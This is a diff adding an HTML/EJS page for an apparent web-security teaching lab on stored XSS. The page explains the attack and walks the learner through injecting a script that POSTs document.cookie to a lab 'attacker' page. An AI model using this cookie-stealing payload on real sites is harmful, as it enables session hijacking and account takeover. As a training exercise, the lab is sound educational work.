@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en" class="html">
+    <!-- <script src="/api/session-p.js" defer></script> -->
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title><%- title.title %> | <%- title.subtitle.xss %></title>
+        <link rel="stylesheet" href="/styles/xss.css">
+        <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
+        <script src="/api/xss_fade.js"></script>
+    </head>
+    <body class="body">
+        <div class="page-wrapper">
+            <header class="title">
+                <h1 class='title-text'><%= title.title %></h1>
+                <img class='title-logo' src= <%-fitlogo%>   alt="FIT">
+            </header>
+            <p id='session-p' style='text-align:end' ></p>
+            <nav>
+                <ul class='topnav'>
+                    <li><a href="/">Home</a></li>
+                    <li><a class="active"  href="/xss">XSS</a></li>
+                    <li><a href="/clickjacking">Clickjacking</a></li>
+                    <li><a href="/csrf">CSRF</a></li>
+                    <li style="float:right"><a href="/about">About</a></li>
+                </ul>
+            </nav>
+            <main class="main">
+                <div class="xss-wrapper">
+                    <div class="xss-wrapper-left">
+                        <h2>Stored XSS</h2>
+                        <p>
+                            Stored XSS is a type of XSS attack that occurs when an attacker is able to store malicious code on a web server. 
+                            The malicious code is then retrieved and executed by any user's browser when they visit the page that contains the malicious code.
+                            This is the most dangerous type of XSS attack, because every visitor to the page will be affected.
+                        </p>
+                        <p>
+                            Attacker can use this vulnerability to steal cookies, session tokens, or other sensitive information retained by your browser and used with that site.
+                            This information can be used to take over user accounts, change web site look, or redirect users to malicious sites.
+                            Attacker can install the <a href="https://github.com/beefproject/beef">BeEf - The Browser Exploitation Framework</a> or other similar software to
+                            further compromise the victim's browser - do various kind of phishing, etc.
+                        </p>
+                        <P>
+                            In this lab, you will make permanent changes to the lab environment. If you want to reset the lab environment, click the button below:
+                        </p>
+                        <button id='reset-button' class="button" type="button">Reset</button>
+
+                        <div>
+                            <ul>
+                                <li class="fadeMe" id="li_1">
+                                    Open the vulnerable page in a new tab.
+                                    <p>
+                                         L
+                                    </p> 
+                                    <button class="reverse" onclick="fade(0)"> Next </button>
+                                </li>
+                                <li class="fadeMe", id="li_2">
+                                    <code>
+&lt;script&gt;
+fetch('<%- full_url %>/frame_attacker', {
+    method: 'POST',
+    body: JSON.stringify(document.cookie)
+});
+&lt;/script&gt;
+                                    </code>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="xss-stored-wrapper-right">
+                        <p>
+                            Vulnerable page: <%- full_url %>/frame
+                        </p>
+                        <div class="example-frame-cls">
+                            <iframe src="/xss_stored/frame" frameborder="0"></iframe>
+                        </div>
+                        <p>
+                            Attacker page: <%- full_url %>/frame_attacker
+                        </p>
+                        <iframe src="/xss_stored/frame_attacker" frameborder="0"></iframe>
+                    </div>
+                </div>
+            </main>
+            <%- include('./_footer'); %>
+        </div>
+    </body>
+</html>
